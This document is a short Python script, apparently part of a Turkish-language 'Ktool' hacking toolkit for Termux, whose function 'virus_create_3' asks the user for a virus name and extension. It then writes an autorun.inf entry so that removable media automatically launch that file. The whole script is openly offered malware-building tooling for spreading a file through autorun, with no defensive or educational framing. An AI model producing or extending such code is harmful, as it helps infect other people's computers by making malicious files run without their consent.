import os

def virus_create_3():
    print('''
\033[97mVirüsünüzün uzantısı ne olsun?
''')

    print("\033[38;2;255;100;100m[1]\033[0m .exe")
    print("\033[38;2;255;100;100m[2]\033[0m .bat")
    print("\033[38;2;255;100;100m[3]\033[0m .py")

    print("\n\033[97m┌─╼[Ktool@termux]-[~]")
    autorn = input("└────╼ ❯❯❯ ").strip()

    if autorn == "1":
        ad = input("Virüs adı ne olsun ❯❯❯ ").strip()
        butun = ad + ".exe"
    elif autorn == "2":
        ad = input("Virüs adı ne olsun ❯❯❯ ").strip()
        butun = ad + ".bat"
    elif autorn == "3":
        ad = input("Virüs adı ne olsun ❯❯❯ ").strip()
        butun = ad + ".py"
    else:
        print("\033[91mGeçersiz seçenek! Ana menüye dönülüyor...")
        return

    try:
        with open("autorun.inf", "a") as dosya:
            dosya.write(f"[autorun]\nopen={butun}\n")
        print(f"\033[92m[✓] autorun.inf oluşturuldu! Açılacak dosya: {butun}")
    except Exception as e:
        print(f"\033[91m[!] Hata oluştu: {e}")
